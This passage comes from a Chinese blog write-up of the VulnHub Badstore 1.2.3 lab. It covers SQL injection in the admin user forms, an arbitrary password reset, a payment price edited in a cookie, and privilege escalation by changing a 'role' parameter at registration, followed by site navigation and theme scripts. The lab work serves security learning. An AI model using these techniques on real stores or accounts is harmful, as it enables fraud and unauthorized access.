+<h3 id="Adminpotal-Add-User"><a href="#Adminpotal-Add-User" class="headerlink" title="Adminpotal Add User"></a>Adminpotal Add User</h3><p>拿到管理员权限后在添加用户处 <code>email</code> 参数<strong>存在 SQL 注入漏洞</strong></p>
+<p><img src="https://pic1.imgdb.cn/item/69672d1699f37a647f572b2a.png"></p>
+<p><img src="https://pic1.imgdb.cn/item/69672d6399f37a647f572b7e.png"></p>
+<h3 id="Adminpotal-Delete-User"><a href="#Adminpotal-Delete-User" class="headerlink" title="Adminpotal Delete User"></a>Adminpotal Delete User</h3><p>同样在删除用户处也存在 SQL 注入</p>
+<p><img src="https://pic1.imgdb.cn/item/69672dd699f37a647f572c0d.png"></p>
+<h2 id="任意密码重置"><a href="#任意密码重置" class="headerlink" title="任意密码重置"></a>任意密码重置</h2><h3 id="Reset-User-Password"><a href="#Reset-User-Password" class="headerlink" title="Reset User Password"></a>Reset User Password</h3><p>在页面找到一个重置密码功能</p>
+<p><img src="https://pic1.imgdb.cn/item/691588043203f7be00fe8637.png"></p>
+<p>推测<strong>存在任意密码重置漏洞</strong>，重置后给出新密码 <code>Welcome</code></p>
+<p><img src="https://pic1.imgdb.cn/item/691587cb3203f7be00fe84bd.png"></p>
+<h2 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h2><h3 id="View-Cart"><a href="#View-Cart" class="headerlink" title="View Cart"></a>View Cart</h3><p>需要先将物品添加到购物车</p>
+<p><img src="https://pic1.imgdb.cn/item/696729e199f37a647f5727aa.png"></p>
+<p>抓包解码发现价格参数在 Cookie 中</p>
+<p><img src="https://pic1.imgdb.cn/item/69672a6299f37a647f57283e.png"></p>
+<p>直接浏览器里更改</p>
+<p><img src="https://pic1.imgdb.cn/item/69672a5799f37a647f572830.png"></p>
+<p>在最后付款页面推测还可能存在 SQL 注入及 XSS</p>
+<h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><h3 id="Login-Register-1"><a href="#Login-Register-1" class="headerlink" title="Login&#x2F;Register"></a>Login&#x2F;Register</h3><p>抓注册包发现有一个权限参数 <code>role</code></p>
+<p><img src="https://pic1.imgdb.cn/item/69672ae399f37a647f5728c0.png"></p>
+<p>改为 A 发送</p>
+<p><img src="https://pic1.imgdb.cn/item/69672b4899f37a647f57291f.png"></p>
+<p>越权成功</p>
+<p><img src="https://pic1.imgdb.cn/item/69672c0999f37a647f5729cb.png"></p>
+
+    </div>
+    <footer class="article-footer">
+        <a class="article-category-link" href="/categories/VulnHub/" title="VulnHub" data-aos="zoom-in">VulnHub</a>
+
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/SQL-%E6%B3%A8%E5%85%A5/" rel="tag" title="SQL 注入">SQL 注入</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/XSS/" rel="tag" title="XSS">XSS</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/" rel="tag" title="任意密码重置">任意密码重置</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/" rel="tag" title="支付漏洞">支付漏洞</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" rel="tag" title="敏感信息泄露">敏感信息泄露</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E8%B6%8A%E6%9D%83/" rel="tag" title="越权">越权</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/images/banner.webp" data-sizes="auto" alt="VulnHub pWnOS：1.0" class="lazyload">
+        <a href="/2026/04/01/pWnOS%201.0/" aria-label="前一篇: VulnHub pWnOS：1.0" title="前一篇: VulnHub pWnOS：1.0"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            VulnHub pWnOS：1.0
+        </h3>
+      </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      ALL
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        34.8k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        02:56
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Badstore-1-2-3"><span class="toc-number">1.</span> <span class="toc-text">Badstore 1.2.3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">1.1.</span> <span class="toc-text">敏感信息泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#supplier-accounts"><span class="toc-number">1.1.1.</span> <span class="toc-text">&#x2F;supplier&#x2F;accounts</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">1.2.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Search-%E6%90%9C%E7%B4%A2%E6%A1%86%EF%BC%88%E5%8F%8D%E5%B0%84%EF%BC%89"><span class="toc-number">1.2.1.</span> <span class="toc-text">Search 搜索框（反射）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sign-Our-Guestbook%EF%BC%88%E4%B8%89%E4%B8%AA%E5%AD%98%E5%82%A8%EF%BC%89"><span class="toc-number">1.2.2.</span> <span class="toc-text">Sign Our Guestbook（三个存储）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#My-Account%EF%BC%88%E6%9C%AA%E7%99%BB%E5%BD%95%EF%BC%8C%E5%8F%8D%E5%B0%84%EF%BC%89"><span class="toc-number">1.2.3.</span> <span class="toc-text">My Account（未登录，反射）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#My-Account%EF%BC%88%E5%B7%B2%E7%99%BB%E5%BD%95%EF%BC%8C%E4%B8%A4%E4%B8%AA%E5%AD%98%E5%82%A8%EF%BC%89"><span class="toc-number">1.2.4.</span> <span class="toc-text">My Account（已登录，两个存储）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Login-Register%EF%BC%88%E4%B8%A4%E4%B8%AA%E5%AD%98%E5%82%A8%EF%BC%89"><span class="toc-number">1.2.5.</span> <span class="toc-text">Login&#x2F;Register（两个存储）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Adminpotal-Add-User%EF%BC%88%E5%AD%98%E5%82%A8%EF%BC%89"><span class="toc-number">1.2.6.</span> <span class="toc-text">Adminpotal Add User（存储）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text">SQL 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Search-%E6%90%9C%E7%B4%A2%E6%A1%86"><span class="toc-number">1.3.1.</span> <span class="toc-text">Search 搜索框</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#What%E2%80%99s-New-Add-ltems-to-Cart"><span class="toc-number">1.3.2.</span> <span class="toc-text">What’s New Add ltems to Cart</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Supplier-Login"><span class="toc-number">1.3.3.</span> <span class="toc-text">Supplier Login</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Login-Register"><span class="toc-number">1.3.4.</span> <span class="toc-text">Login&#x2F;Register</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Adminpotal-Add-User"><span class="toc-number">1.3.5.</span> <span class="toc-text">Adminpotal Add User</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Adminpotal-Delete-User"><span class="toc-number">1.3.6.</span> <span class="toc-text">Adminpotal Delete User</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE"><span class="toc-number">1.4.</span> <span class="toc-text">任意密码重置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reset-User-Password"><span class="toc-number">1.4.1.</span> <span class="toc-text">Reset User Password</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.</span> <span class="toc-text">支付漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#View-Cart"><span class="toc-number">1.5.1.</span> <span class="toc-text">View Cart</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83"><span class="toc-number">1.6.</span> <span class="toc-text">越权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Login-Register-1"><span class="toc-number">1.6.1.</span> <span class="toc-text">Login&#x2F;Register</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="ALL" class="lazyload">
+  <div class="sidebar-author-name">ALL</div>
+  <div class="sidebar-description">雾島风起時の日常</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">39</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">22</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/duckpigdog itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-bilibili sidebar-social-icon">
+      <a href=https://space.bilibili.com/1337537884?spm_id_from=333.1007.0.0 itemprop="url" target="_blank" aria-label="bilibili" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "ALL",
+          title: "VulnHub Badstore：1.2.3",
+          url: "http://example.com/2026/04/01/Badstore%201.2.3/",
+          excerpt: "",
+          description: "",
+          stripContent: "Badstore 1.2.3项目地址 1docker pull suc2es2/badstore  使用 Nmap 扫描出开放服务及操作系统版本 1nmap -sS -sV -O -p- 192.168.41.129       打开访问网站  使用 dirb 扫描后台 1dirb http://192.168.41.129:8080/   敏感信息泄露&amp;#x2F;supplier&amp;#x2F;accounts路径 /supplier/accounts 泄露了类型 etc/passwd 的敏感信息",
+          date: "Wed Apr 01 2026 16:00:00 GMT+0800",
+          updated: "Wed Apr 01 2026 17:07:22 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
